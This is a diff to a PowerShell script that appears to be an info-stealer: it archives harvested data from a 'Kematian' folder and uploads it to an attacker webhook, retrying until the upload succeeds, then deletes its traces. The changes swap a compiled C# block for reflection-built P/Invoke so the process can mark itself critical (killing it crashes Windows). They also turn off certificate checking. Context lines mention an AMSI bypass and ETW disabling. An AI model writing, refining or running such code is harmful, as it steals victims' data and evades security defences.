@@ -8,7 +8,8 @@
 #$write_disk_only = $false
 #$vm_protect = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
-
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -33,36 +34,27 @@ function KDMUTEX {
         throw "[!] An instance of this script is already running."
     }
     elseif ($criticalprocess -and -not $debug) {
-        [ProcessUtility]::MakeProcessCritical()
+        CRITICAL_PROCESS
     }
     Invoke-TASKS
 }
 
-
-#THIS CODE WAS MADE BY EvilByteCode
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-public static class ProcessUtility
-{
-    [DllImport("ntdll.dll", SetLastError = true)]
-    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
-
-    public static void MakeProcessCritical()
-    {
-        Process.EnterDebugMode();
-        RtlSetProcessIsCritical(1, 0, 0);
-    }
-
-    public static void MakeProcessKillable()
-    {
-        RtlSetProcessIsCritical(0, 0, 0);
-    }
+function CRITICAL_PROCESS {
+    [System.Diagnostics.Process]::EnterDebugMode()
+    $domain = [AppDomain]::CurrentDomain
+    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $module = $assembly.DefineDynamicModule('DynamicModule')
+    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
+    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical','ntdll.dll',
+    [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+    [System.Runtime.InteropServices.CallingConvention]::Winapi,[void],[System.Type[]]@([uint32], [uint32], [uint32]),
+    [System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Ansi)
+    $type = $typeBuilder.CreateType()
+    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
+    $methodInfo.Invoke($null, @([uint32]1, [uint32]0, [uint32]0))
 }
-"@
-#END OF CODE MADE BY EvilByteCode
+
 
 # Request admin with AMSI bypass and ETW Disable
 function CHECK_AND_PATCH {
@@ -1110,43 +1102,21 @@ function Backup-Data {
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
 
-
     Write-Host $ZipFilePath
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     if ( -not ($write_disk_only)) {    
-        Add-Type @"
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-
-public class TrustAllCertsPolicy : ICertificatePolicy {
-    public bool CheckValidationResult(
-        ServicePoint srvPoint, X509Certificate certificate,
-        WebRequest request, int certificateProblem) {
-        return true;
-    }
-}
-"@
-        
-        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-
         $went_through = $false
         while (-not $went_through) {
             try {
                 $httpClient = [Net.Http.HttpClient]::new()
                 $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-
                 $fileStream = [IO.File]::OpenRead($zipFilePath)
                 $fileContent = [Net.Http.StreamContent]::new($fileStream)
-
                 $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-
                 $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-
                 $response = $httpClient.PostAsync($webhook, $multipartContent).Result
                 $responseContent = $response.Content.ReadAsStringAsync().Result
-
                 Write-Host $responseContent
-
                 $went_through = $true
             }
             catch {
@@ -1155,17 +1125,13 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
                 Start-Sleep -Seconds $sleepTime
             }
         }
-        
         $fileStream.Dispose()
         $httpClient.Dispose()
         $multipartContent.Dispose()
         $fileContent.Dispose()
-
         Remove-Item "$zipFilePath" -Force
     }
-
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
-
     # cleanup
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
@@ -1173,7 +1139,7 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
 if (CHECK_AND_PATCH -eq $true) {  
     KDMUTEX
     if (!($debug)) {
-        [ProcessUtility]::MakeProcessKillable()
+        $methodInfo.Invoke($null, @([uint32]0, [uint32]0, [uint32]0))
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
